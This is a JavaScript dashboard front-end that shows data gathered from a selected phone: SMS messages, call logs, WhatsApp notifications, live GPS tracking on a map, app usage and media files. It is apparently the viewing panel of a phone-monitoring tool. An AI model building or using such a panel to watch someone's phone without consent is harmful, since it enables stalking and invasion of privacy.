const apiBase = '/api';
let socket = null;
let currentDevice = null;
let map = null;
let markers = [];

document.addEventListener('DOMContentLoaded', () => {
  // menu click
  document.querySelectorAll('.menu li').forEach(li => {
    li.addEventListener('click', () => {
      document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
      const s = li.dataset.section;
      document.getElementById(s).classList.remove('hidden');
      if (s === 'location') setTimeout(initMap, 200);
    });
  });

  document.getElementById('btnSelect').addEventListener('click', () => {
    const d = document.getElementById('deviceIdInput').value.trim();
    if (!d) return alert('Informe o deviceId');
    selectDevice(d);
  });

  // default: show sms
  document.querySelector('.menu li[data-section="sms"]').click();
});

function selectDevice(deviceId) {
  currentDevice = deviceId;
  // join socket room
  if (!socket) {
    socket = io({ transports: ['websocket'] });
    socket.on('connect', () => console.log('socket connected', socket.id));
    socket.on('location', data => {
      if (!currentDevice) return;
      if (data.deviceId !== currentDevice) return;
      addMarker(data.lat, data.lon, data.timestamp);
      updateLastSeen(new Date(data.timestamp || Date.now()));
    });
  }
  socket.emit('joinDevice', deviceId);
  // fetch initial data
  fetchLists();
  // update status (device lastSeen)
  fetch('/api/devices').then(r=>r.json()).then(list => {
    const dev = list && list.find(x => x.deviceId === deviceId);
    if (dev) {
      document.getElementById('statusDot').className = dev.online ? 'online' : 'offline';
      document.getElementById('lastSeen').innerText = dev.lastSeen ? new Date(dev.lastSeen).toLocaleString() : '-';
    } else {
      document.getElementById('statusDot').className = 'offline';
      document.getElementById('lastSeen').innerText = '-';
    }
  }).catch(()=>{});
}

async function fetchLists() {
  if (!currentDevice) return;
  // sms
  const sms = await getJson(apiBase + '/sms?deviceId=' + encodeURIComponent(currentDevice));
  renderSms(sms);

  const calls = await getJson(apiBase + '/call?deviceId=' + encodeURIComponent(currentDevice));
  renderCalls(calls);

  const notifs = await getJson(apiBase + '/whatsapp?deviceId=' + encodeURIComponent(currentDevice));
  renderNotifs(notifs);

  const locs = await getJson(apiBase + '/location?deviceId=' + encodeURIComponent(currentDevice));
  renderLocations(locs);

  const usage = await getJson(apiBase + '/app-usage?deviceId=' + encodeURIComponent(currentDevice));
  renderUsage(usage);

  const media = await getJson(apiBase + '/media?deviceId=' + encodeURIComponent(currentDevice));
  renderMedia(media);
}

function getJson(url) {
  return fetch(url).then(r => {
    if (!r.ok) return [];
    return r.json();
  }).catch(()=>[]);
}

function renderSms(list) {
  const el = document.getElementById('smsList'); el.innerHTML = '';
  list.forEach(s => {
    const li = document.createElement('li');
    li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`;
    el.appendChild(li);
  });
}

function renderCalls(list) {
  const el = document.getElementById('callsList'); el.innerHTML = '';
  list.forEach(c => {
    const li = document.createElement('li');
    li.textContent = `${c.number || 'unknown'} - ${c.state} (${c.duration? c.duration+'ms':''}) ${new Date(c.timestamp).toLocaleString()}`;
    el.appendChild(li);
  });
}

function renderNotifs(list) {
  const el = document.getElementById('notifsList'); el.innerHTML = '';
  list.forEach(n => {
    const li = document.createElement('li');
    li.textContent = `${n.packageName || ''} ${n.title ? '['+n.title+'] ' : ''} ${n.message} (${new Date(n.timestamp).toLocaleString()})`;
    el.appendChild(li);
  });
}

function initMap() {
  if (map) return;
  map = L.map('map').setView([0,0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap contributors'
  }).addTo(map);
}

function renderLocations(list) {
  const el = document.getElementById('locList'); el.innerHTML = '';
  markers.forEach(m => map.removeLayer(m));
  markers = [];
  list.forEach(l => {
    const li = document.createElement('li');
    li.textContent = `${l.lat.toFixed(5)}, ${l.lon.toFixed(5)} (${l.accuracy}) - ${new Date(l.timestamp).toLocaleString()}`;
    el.appendChild(li);
    if (map) {
      const m = L.marker([l.lat, l.lon]).addTo(map);
      markers.push(m);
    }
  });
  if (markers.length) {
    const group = new L.featureGroup(markers);
    map.fitBounds(group.getBounds().pad(0.2));
  }
}

function addMarker(lat, lon, timestamp) {
  if (!map) initMap();
  const m = L.circleMarker([lat, lon], { radius:6 }).addTo(map);
  markers.push(m);
  if (markers.length > 120) {
    const old = markers.shift();
    if (old) map.removeLayer(old);
  }
}

function renderUsage(list) {
  const el = document.getElementById('usageList'); el.innerHTML = '';
  list.forEach(u => {
    const li = document.createElement('li');
    li.textContent = `${u.packageName}: ${u.totalTime} ms (last ${new Date(u.lastTimeUsed).toLocaleString()})`;
    el.appendChild(li);
  });
}

function renderMedia(list) {
  const el = document.getElementById('mediaList'); el.innerHTML = '';
  list.forEach(m => {
    const li = document.createElement('li');
    const a = document.createElement('a');
    a.href = '/api/media/' + m.gridFsId;
    a.textContent = (m.filename || m._id) + ' (' + (m.type||'') + ')';
    a.target = '_blank';
    li.appendChild(a);
    el.appendChild(li);
  });
}

function updateLastSeen(d) {
  document.getElementById('lastSeen').innerText = d ? d.toLocaleString() : '-';
  document.getElementById('statusDot').className = 'online';
}
